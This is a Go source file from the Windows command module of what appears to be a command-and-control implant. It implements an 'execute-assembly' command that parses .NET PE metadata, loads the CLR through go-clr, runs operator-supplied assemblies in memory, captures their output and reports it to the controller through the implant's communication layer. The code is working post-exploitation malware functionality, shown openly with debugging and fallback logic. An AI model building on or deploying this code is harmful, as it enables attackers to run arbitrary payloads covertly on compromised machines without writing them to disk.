//go:build windows
// +build windows

package commands

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/Ne0nd0g/go-clr"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
	// 阶段三-6：execute-assembly 全局执行互斥（单例 CLR 限制，串行化保证输出完整）
	execAssemblyMu sync.Mutex
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
	// runtime 记录程序集加载进哪个 CLR 家族（"v2"/"v4"）。
	// MethodInfo 只在其所属 AppDomain 有效，跨运行时回退时不能复用缓存。
	runtime string
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	runtime     string // 已加载的 CLR 家族：v2 / v4
	sync.Mutex
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}

// GetRuntimeHost 取指定 CLR 家族（"v2"/"v4"）的运行时宿主。
//
// 原实现把第一次 LoadCLR 的宿主永久缓存且忽略后续 runtime 参数，
// 导致 ExecuteAssembly 的"换一个 CLR 版本重试"永远命中同一个宿主——
// 版本回退是死代码。现在按运行时区分：请求的家族不同才重新 LoadCLR，
// 失败时把错误带回给调用方（原实现丢弃 LoadCLR 的 error，只剩一句
// "Could not load CLR runtime host"）。
func (c *CLRInstance) GetRuntimeHost(runtime string, debug bool) (*clr.ICORRuntimeHost, error) {
	c.Lock()
	defer c.Unlock()
	if runtime == "" {
		runtime = "v4"
	}
	if c.runtimeHost != nil && c.runtime == runtime {
		return c.runtimeHost, nil
	}
	if debug {
		log.Printf("Initializing CLR runtime %s", runtime)
	}
	host, err := clr.LoadCLR(runtime)
	if err != nil {
		return nil, fmt.Errorf("load CLR %s: %w", runtime, err)
	}
	if host == nil {
		// go-clr 在目标运行时未安装时会静默选中最后一个已安装运行时，
		// 这里把空宿主当成错误，交给上层换版本重试。
		return nil, fmt.Errorf("load CLR %s: empty runtime host (runtime not installed?)", runtime)
	}
	// CLR 在启动时捕获当时的 STD 句柄，且此后不会跟随 RestoreStdoutStderr 回退。
	// 因此每加载一个**新的**运行时宿主（v4 失败后回退 v2），都必须先重定向：
	// 此时上一次 LoadBin 已 Restore，origSTDOUT 又是进程原始句柄，重复调用安全。
	// 复用同一宿主时不要重定向——它的捕获管道仍然有效，重定向只会多泄漏一组管道。
	if err := clr.RedirectStdoutStderr(); err != nil {
		if debug {
			log.Printf("could not redirect stdout/stderr: %v\n", err)
		}
	}
	c.runtimeHost = host
	c.runtime = runtime
	return host, nil
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte, runtime string) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash, runtime: runtime}
	// 【优化】缓存上限：超过 32 个程序集时丢弃最旧的，防止内存无限增长
	if len(assemblies) >= 32 {
		assemblies = append([]*assembly(nil), assemblies[1:]...)
	}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte, runtime string) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash && asm.runtime == runtime {
			return asm
		}
	}
	return nil
}

// ===== PE / CLR 元数据解析 =====
//
// 原实现把 PE 前 512KB 当字符串扫 "v4.5"/"v4.8" 等子串，问题有两个：
//   1. 先查 "v4.0.30319"，而所有 .NET 4.x 程序集的元数据版本都是它，
//      后面 v4.5~v4.8 的分支永远走不到；
//   2. 这些"版本"对 go-clr 没有意义——CLR 只有 v2 与 v4 两个家族
//      （v4.5/4.6/4.7/4.8 都跑在 v4.0.30319 上），传 "v4.5" 给
//      clr.LoadCLR 只会匹配不到而静默落到"最后一个运行时"。
// 这里按 ECMA-335 读取 CLI 头 → 元数据根里的真实版本串，只归一到 v2/v4。

// peRvaToOffset 把 RVA 映射到文件偏移（遍历节表）。
func peRvaToOffset(data []byte, peOff, numSections, optOff, optSize int, rva uint32) (int, bool) {
	secOff := optOff + optSize
	for i := 0; i < numSections; i++ {
		s := secOff + i*40
		if s+40 > len(data) {
			return 0, false
		}
		virtualSize := binary.LittleEndian.Uint32(data[s+8 : s+12])
		virtualAddr := binary.LittleEndian.Uint32(data[s+12 : s+16])
		rawSize := binary.LittleEndian.Uint32(data[s+16 : s+20])
		rawPtr := binary.LittleEndian.Uint32(data[s+20 : s+24])
		span := virtualSize
		if rawSize > span {
			span = rawSize
		}
		if rva >= virtualAddr && rva < virtualAddr+span {
			off := int(rawPtr + (rva - virtualAddr))
			if off < 0 || off >= len(data) {
				return 0, false
			}
			return off, true
		}
	}
	return 0, false
}

// detectAssemblyRuntime 读取程序集元数据的 CLR 版本串，返回 (家族, 原始版本)。
// 家族为 "v2"/"v4"；非托管 PE 或解析失败时两者都为空。
func detectAssemblyRuntime(data []byte) (family, version string) {
	if len(data) < 0x40 || data[0] != 'M' || data[1] != 'Z' {
		return "", ""
	}
	peOff := int(binary.LittleEndian.Uint32(data[60:64]))
	if peOff < 0 || peOff+24 > len(data) {
		return "", ""
	}
	if !bytes.Equal(data[peOff:peOff+4], []byte{'P', 'E', 0, 0}) {
		return "", ""
	}
	numSections := int(binary.LittleEndian.Uint16(data[peOff+6 : peOff+8]))
	optSize := int(binary.LittleEndian.Uint16(data[peOff+20 : peOff+22]))
	optOff := peOff + 24
	if optSize < 2 || optOff+optSize > len(data) {
		return "", ""
	}
	// DataDirectory 在 Optional Header 里的偏移：PE32=96，PE32+=112；CLI 是第 14 项。
	var dataDirOff int
	switch binary.LittleEndian.Uint16(data[optOff : optOff+2]) {
	case 0x10b: // PE32
		dataDirOff = optOff + 96
	case 0x20b: // PE32+
		dataDirOff = optOff + 112
	default:
		return "", ""
	}
	cliDir := dataDirOff + 14*8
	if cliDir+8 > len(data) {
		return "", ""
	}
	cliRVA := binary.LittleEndian.Uint32(data[cliDir : cliDir+4])
	cliSize := binary.LittleEndian.Uint32(data[cliDir+4 : cliDir+8])
	if cliRVA == 0 || cliSize < 16 { // 没有 CLI 头：普通原生 PE
		return "", ""
	}
	cliOff, ok := peRvaToOffset(data, peOff, numSections, optOff, optSize, cliRVA)
	if !ok || cliOff+16 > len(data) {
		return "", ""
	}
	metaRVA := binary.LittleEndian.Uint32(data[cliOff+8 : cliOff+12])
	if metaRVA == 0 {
		return "", ""
	}
	metaOff, ok := peRvaToOffset(data, peOff, numSections, optOff, optSize, metaRVA)
	if !ok || metaOff+20 > len(data) {
		return "", ""
	}
	// 元数据根签名 "BSJB"
	if binary.LittleEndian.Uint32(data[metaOff:metaOff+4]) != 0x424A5342 {
		return "", ""
	}
	verLen := int(binary.LittleEndian.Uint32(data[metaOff+12 : metaOff+16]))
	if verLen <= 0 || verLen > 256 || metaOff+16+verLen > len(data) {
		return "", ""
	}
	version = strings.TrimRight(string(data[metaOff+16:metaOff+16+verLen]), "\x00")
	switch {
	case strings.HasPrefix(version, "v2."):
		family = "v2"
	case strings.HasPrefix(version, "v4."):
		family = "v4"
	}
	return family, version
}

// installedCLRFamilies 枚举本机可加载的 CLR 家族（v2/v4）。
// 取不到时返回 nil，调用方按"全都试一遍"处理。
func installedCLRFamilies() map[string]bool {
	metahost, err := clr.CLRCreateInstance(clr.CLSID_CLRMetaHost, clr.IID_ICLRMetaHost)
	if err != nil || metahost == nil {
		return nil
	}
	runtimes, err := clr.GetInstalledRuntimes(metahost)
	if err != nil {
		return nil
	}
	families := make(map[string]bool, 2)
	for _, r := range runtimes {
		switch {
		case strings.HasPrefix(r, "v2."):
			families["v2"] = true
		case strings.HasPrefix(r, "v4."):
			families["v4"] = true
		}
	}
	return families
}

// clrVersionOrder 按程序集目标运行时给出 CLR 家族尝试顺序。
// 只有 v2/v4 是真实存在的运行时；同一家族内的 4.x 版本没有独立运行时。
func clrVersionOrder(family string) []string {
	if family == "v2" {
		return []string{"v2", "v4"}
	}
	return []string{"v4", "v2"}
}

func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (string, error) {
	// 【阶段三-6】全局互斥：go-clr 为单例 CLR host + 进程级 stdout 重定向，
	// 并发执行会互相污染句柄/管道导致输出丢失。串行化保证每次执行输出完整捕获。
	execAssemblyMu.Lock()
	defer execAssemblyMu.Unlock()

	// 无论成功失败，调用结束后恢复进程级 STDOUT/STDERR 句柄，
	// 避免 go-clr 的 RedirectStdoutStderr 永久污染导致后续子进程/ConPTY 交互终端异常。
	// （go-clr 说明：已实例化的 CLR 会继续向重定向管道写入，输出捕获不受影响。）
	defer clr.RestoreStdoutStderr()

	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	// 验证程序集数据有效性
	if len(data) < 64 {
		return "", errors.New("Invalid assembly data: too small")
	}

	// 检查PE头和.NET标识
	if data[0] != 0x4D || data[1] != 0x5A {
		return "", errors.New("Invalid assembly data: not a valid PE file")
	}

	rtHost, hostErr := clrInstance.GetRuntimeHost(runtime, debug)
	if hostErr != nil {
		// 运行时刚加载时偶发失败：重试一次再交给上层换版本。
		time.Sleep(time.Second)
		rtHost, hostErr = clrInstance.GetRuntimeHost(runtime, debug)
		if hostErr != nil {
			return "", fmt.Errorf("could not load CLR %s: %w", runtime, hostErr)
		}
	}

	if asm := getAssembly(data, runtime); asm != nil {
		methodInfo = asm.methodInfo
		if debug {
			log.Printf("Using cached assembly")
		}
	} else {
		if debug {
			log.Printf("Loading new assembly, size: %d bytes", len(data))
		}
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			if debug {
				log.Printf("Assembly load failed: %v", err)
			}
			// 提供更详细的错误信息
			errorMsg := fmt.Sprintf("Failed to load .NET assembly: %v\n", err)
			errorMsg += "Possible causes:\n"
			errorMsg += "1. Assembly requires higher privileges\n"
			errorMsg += "2. CLR version incompatibility\n"
			errorMsg += "3. Missing dependencies\n"
			errorMsg += "4. Assembly corruption\n"
			return errorMsg, err
		}
		addAssembly(methodInfo, data, runtime)
		if debug {
			log.Printf("Assembly loaded successfully")
		}
	}

	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}

	if debug {
		log.Printf("Assembly loaded, methodInfo: %+v", methodInfo)
		log.Printf("Calling assembly with args: %+v", assemblyArgs)
	}

	// 安全地调用程序集，使用defer确保异常恢复
	var stdout, stderr string
	var invokeErr error

	func() {
		defer func() {
			if r := recover(); r != nil {
				if debug {
					log.Printf("Assembly invocation panic recovered: %v", r)
				}
				// 将panic转换为错误，但不中断执行
				stderr += fmt.Sprintf("\n[Warning] CLR cleanup error: %v", r)
			}
		}()

		stdout, stderr = clr.InvokeAssembly(methodInfo, assemblyArgs)
	}()

	if debug {
		log.Printf("Assembly execution completed")
		log.Printf("Stdout length: %d, Stderr length: %d", len(stdout), len(stderr))
	}

	// 合并输出并返回
	output := strings.TrimSpace(stdout)
	if stderr != "" {
		// 过滤掉CLR清理相关的错误信息，这些不影响实际功能
		cleanStderr := strings.TrimSpace(stderr)
		if !strings.Contains(cleanStderr, "The handle is invalid") &&
			!strings.Contains(cleanStderr, "MethodInfo:Invoke") &&
			!strings.Contains(cleanStderr, "method returned an error") {
			if output != "" {
				output += "\n" + cleanStderr
			} else {
				output = cleanStderr
			}
		} else if debug {
			log.Printf("Filtered CLR cleanup warning: %s", cleanStderr)
		}
	}

	if output == "" {
		output = "[*] Assembly executed successfully (no output generated)"
	}

	return output, invokeErr
}

func ExecuteAssembly(sh []byte, arguments string, execTaskID uint32) ([]byte, error) {
	// 立即发送开始执行信息
	communication.ExecOutput([]byte("[*] Starting .NET Assembly execution..."))
	communication.ExecOutput([]byte(fmt.Sprintf("[*] Assembly size: %d bytes", len(sh))))
	communication.ExecOutput([]byte(fmt.Sprintf("[*] Arguments: %s", arguments)))

	// 采用Tshell的简洁有效实现方式
	go func() {
		// 完成回执只发一次：正常路径与 panic 路径都经过 sendDone。
		doneSent := false
		sendDone := func(ok bool, errMsg string) {
			if doneSent {
				return
			}
			doneSent = true
			communication.ExecDone(execTaskID, ok, errMsg)
		}
		defer func() {
			if r := recover(); r != nil {
				errMsg := fmt.Sprintf("assembly panic: %v", r)
				debuglog.Printf("[PANIC] %s\n", errMsg)
				communication.ErrorProcess(errors.New(errMsg))
				sendDone(false, errMsg)
			}
		}()

		debug := true
		params := strings.Split(arguments, " ")

		// 读元数据确定程序集目标运行时（v2/v4），据此决定回退顺序。
		detectedFamily, detectedVersion := detectAssemblyRuntime(sh)
		if detectedVersion == "" {
			communication.ExecOutput([]byte("[*] CLR metadata not found, assuming v4"))
		} else {
			communication.ExecOutput([]byte(fmt.Sprintf("[*] Assembly CLR: %s (family %s)", detectedVersion, detectedFamily)))
		}

		// 已安装家族过滤：未安装的运行时不必浪费一次加载尝试
		// （go-clr 在目标缺失时会静默落到最后一个已安装运行时）。
		clrVersions := clrVersionOrder(detectedFamily)
		if installed := installedCLRFamilies(); len(installed) > 0 {
			names := make([]string, 0, len(installed))
			for name := range installed {
				names = append(names, name)
			}
			communication.ExecOutput([]byte(fmt.Sprintf("[*] Installed CLR: %v", names)))
			filtered := make([]string, 0, len(clrVersions))
			for _, v := range clrVersions {
				if installed[v] {
					filtered = append(filtered, v)
				}
			}
			if len(filtered) > 0 {
				clrVersions = filtered
			}
		}
		communication.ExecOutput([]byte(fmt.Sprintf("[*] CLR version order: %v", clrVersions)))

		var lastError error
		var stdout string

		for _, version := range clrVersions {
			communication.ExecOutput([]byte(fmt.Sprintf("[*] Trying CLR version %s...", version)))
			stdout, lastError = LoadBin(sh, params, version, debug)
			if lastError == nil {
				communication.ExecOutput([]byte(fmt.Sprintf("[+] Successfully loaded with CLR %s", version)))
				break
			} else {
				communication.ExecOutput([]byte(fmt.Sprintf("[!] CLR %s failed: %v", version, lastError)))
			}
		}

		if lastError != nil {
			debuglog.Printf("[DEBUG] All CLR versions failed. Last output: \n%s\n", stdout)
			communication.ErrorProcess(errors.New("All CLR versions failed: " + lastError.Error()))
			if stdout != "" {
				communication.ExecOutput([]byte("[*] Partial output:"))
				communication.ExecOutput([]byte(stdout))
			}
			sendDone(false, lastError.Error())
			return
		}

		// 成功执行，发送输出
		communication.ExecOutput([]byte("[+] Assembly execution completed successfully"))
		communication.ExecOutput([]byte(stdout))
		sendDone(true, "")
	}()

	return []byte("[*] Executing..."), nil
}
